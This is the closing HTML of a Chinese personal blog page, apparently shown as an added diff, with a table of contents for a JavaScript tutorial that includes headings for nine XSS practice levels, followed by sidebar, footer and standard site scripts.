+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第一章-知识"><span class="nav-text">第一章 知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、实现"><span class="nav-text">1、实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、HTML-DOM-文档对象模型"><span class="nav-text">2、HTML DOM(文档对象模型)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1、查找html元素"><span class="nav-text">2.1、查找html元素</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2、改变HTML"><span class="nav-text">2.2、改变HTML</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3、改变HTML样式"><span class="nav-text">2.3、改变HTML样式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-4、DOM事件响应"><span class="nav-text">2.4、DOM事件响应</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-5、改变节点"><span class="nav-text">2.5、改变节点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、重要语法"><span class="nav-text">3、重要语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、数组"><span class="nav-text">4、数组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、字符串"><span class="nav-text">5、字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6、正则表达式"><span class="nav-text">6、正则表达式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#6-1、定义正则表达式"><span class="nav-text">6.1、定义正则表达式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-2、方法"><span class="nav-text">6.2、方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-3、方括号"><span class="nav-text">6.3、方括号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-4、量词"><span class="nav-text">6.4、量词</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7、JS-windows"><span class="nav-text">7、JS windows</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#7-1、浏览器窗口尺寸"><span class="nav-text">7.1、浏览器窗口尺寸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-2、screen对象"><span class="nav-text">7.2、screen对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-3、location对象"><span class="nav-text">7.3、location对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-4、Navigator对象"><span class="nav-text">7.4、Navigator对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-5、windows对象"><span class="nav-text">7.5、windows对象</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8、函数"><span class="nav-text">8、函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#8-1、定义声明"><span class="nav-text">8.1、定义声明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-2、参数"><span class="nav-text">8.2、参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-3、调用"><span class="nav-text">8.3、调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-4、闭包"><span class="nav-text">8.4、闭包</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二章-实战"><span class="nav-text">第二章 实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、XSS（跨站脚本攻击）"><span class="nav-text">1、XSS（跨站脚本攻击）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1、实验环境"><span class="nav-text">1.1、实验环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2、第一关"><span class="nav-text">1.2、第一关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3、第二关"><span class="nav-text">1.3、第二关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4、第三关"><span class="nav-text">1.4、第三关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5、第四关"><span class="nav-text">1.5、第四关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-6、第五关"><span class="nav-text">1.6、第五关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-7、第六关"><span class="nav-text">1.7、第六关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-8、第七关"><span class="nav-text">1.8、第七关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-9、第八关"><span class="nav-text">1.9、第八关</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-10、第九关"><span class="nav-text">1.10、第九关</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、JS实战"><span class="nav-text">2、JS实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、JS代码阅读"><span class="nav-text">3、JS代码阅读</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gwolfs"
+      src="/images/head1.png">
+  <p class="site-author-name" itemprop="name">gwolfs</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/TataYdq" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TataYdq" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1937441951@qq.com" title="E-Mail → mailto:1937441951@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+<!-- CloudCalendar -->
+<div class="widget-wrap" style="width: 90%;margin-left: auto;margin-right: auto; opacity: 0.97;">
+	<div class="widget" id="CloudCalendar"></div>
+</div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备19000724号-1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802028114" rel="noopener" target="_blank">京公网安备 11010802028114号 </a>
+  </div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gwolfs</span>
+</div>
+
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共16.6k字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+<!-- calendar widget -->
+
+
+</body>
+</html>
